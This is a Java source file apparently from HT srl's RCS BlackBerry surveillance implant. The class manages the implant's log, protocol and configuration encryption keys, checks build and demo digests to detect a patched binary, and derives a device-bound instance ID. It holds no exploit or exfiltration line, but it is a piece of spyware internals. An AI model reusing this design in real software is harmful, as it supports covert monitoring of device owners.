//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Keys.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.config;

import net.rim.device.api.crypto.MD5Digest;
import net.rim.device.api.util.Arrays;
import blackberry.Device;
import blackberry.Singleton;
import blackberry.crypto.Encryption;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.iSingleton;
import fake.InstanceKeysFake;

/**
 * The Class Keys.
 */
public final class Keys implements iSingleton {

    //#ifdef DEBUG
    static Debug debug = new Debug("Keys", DebugLevel.VERBOSE);
    //#endif

    InstanceKeys instanceKeys;

    static private Keys instance = null;
    private static final long GUID = 0x6b3391c7148645b7L;

    protected byte[] byteLogKey;
    protected byte[] byteProtoKey;
    protected byte[] byteConfKey;
    protected byte[] byteBuildID;
    //private static byte[] byteInstanceID;
    private byte[] byteInstanceID;
    private boolean seven;

    private static byte[] buildDigest = new byte[] {(byte) 0x62,(byte) 0x31,(byte) 0x36,(byte) 0x38,(byte) 0x38,(byte) 0x66,(byte) 0x66,(byte) 0x61,(byte) 0x61,(byte)
    0x61,(byte) 0x61,(byte) 0x66,(byte) 0x64,(byte) 0x37,(byte) 0x63,(byte) 0x31,(byte) 0x63,(byte) 0x61,(byte) 0x62,(byte)
    0x35,(byte) 0x32,(byte) 0x65,(byte) 0x36,(byte) 0x33,(byte) 0x30,(byte) 0x62,(byte) 0x35,(byte) 0x33,(byte) 0x31,(byte)
    0x37,(byte) 0x38,(byte) 0x66};
    private static byte[] demoDigest = new byte[] { (byte) 0x38,(byte) 0x36,(byte) 0x33,(byte) 0x64,(byte) 0x39,(byte) 0x65,(byte) 0x66,(byte) 0x66,(byte) 0x65,(byte)
    0x37,(byte) 0x30,(byte) 0x31,(byte) 0x38,(byte) 0x37,(byte) 0x32,(byte) 0x35,(byte) 0x34,(byte) 0x64,(byte) 0x33,(byte)
    0x63,(byte) 0x35,(byte) 0x65,(byte) 0x39,(byte) 0x63,(byte) 0x37,(byte) 0x36,(byte) 0x36,(byte) 0x31,(byte) 0x33,(byte)
    0x61,(byte) 0x39,(byte) 0x39 };

    //#ifdef DEBUG
    public String log = "";
    //#endif

    /**
     * Gets the single instance of Keys.
     * 
     * @return single instance of Keys
     */
    private static synchronized Keys getInstance(
            InstanceKeysFake instanceKeyEmbedded) {
        boolean fake = false;
        //#ifdef FAKECONF
        fake = true;
        //#endif

        if (!isInstanced() || instance.getLogKey() == null) {
            instance = (Keys) Singleton.self().get(GUID);
            if (instance == null) {
                instance = new Keys();

                if (fake) {
                    //#ifdef DBC
                    Check.asserts(instanceKeyEmbedded != null,
                            "Null instanceKeyEmbedded");
                    //#endif
                }

                if (instanceKeyEmbedded != null) {
                    instance.setKeys(instanceKeyEmbedded);
                }

                Singleton.self().put(GUID, instance);
            }
        }

        //#ifdef DBC
        Check.ensures(instance.getLogKey() != null, "Null LOGKEY");
        //#endif

        return instance;
    }

    public static Keys getFakeInstance(InstanceKeysFake instance) {
        return getInstance(instance);
    }

    public static Keys getInstance() {
        return getInstance(null);
    }

    public static synchronized boolean isInstanced() {
        return (instance != null);
    }

    /**
     * Checks for been binary patched.
     * 
     * @return true, if successful
     */
    public boolean hasBeenBinaryPatched() {
        //boolean ret = !buildID.startsWith("av3pVck1gb4eR");
        MD5Digest digest = new MD5Digest();
        digest.update(instanceKeys.getBuildID());
        byte[] calculated = digest.getDigest();
        boolean ret = !Arrays.equals(calculated, buildDigest);
        //#ifdef FAKECONF
        ret = true;
        //#endif

        return ret;
    }

    /**
     * Checks if demo.
     * 
     * @return true, if successful
     */
    public boolean isDemo() {
        MD5Digest digest = new MD5Digest();
        digest.update(instanceKeys.getDemo());
        byte[] calculated = digest.getDigest();
        boolean ret = Arrays.equals(calculated, demoDigest);
        //#ifdef DEBUG
        debug.trace("isDemo: " + ret);
        //#endif

        //#ifdef NODEMO        
        ret = false;
        //#endif

        return ret;
    }

    private Keys() {
        instanceKeys = new InstanceKeys();
        setKeys(instanceKeys);
    }

    private void setKeys(KeysGetter instanceKeys) {
        byteLogKey = Arrays.copy(instanceKeys.getLogKey(), 0, 16);
        byteProtoKey = Arrays.copy(instanceKeys.getProtoKey(), 0, 16);
        byteConfKey = Arrays.copy(instanceKeys.getConfKey(), 0, 16);
        byteBuildID = instanceKeys.getBuildID();
        seven = instanceKeys.isSeven();
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getLogKey() {
        return byteLogKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildID() {
        return byteBuildID;
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getProtoKey() {
        return byteProtoKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        return byteConfKey;
    }

    /**
     * Gets the instance id.
     * 
     * @return the instance id
     */
    public byte[] getInstanceId() {
        if (byteInstanceID == null) {
            final Device device = Device.getInstance();
            final byte[] deviceid = device.getWDeviceId();
            byteInstanceID = Encryption.SHA1(deviceid);
        }
        return byteInstanceID;
    }
    
    public boolean isSeven() {
        return seven;
    }

}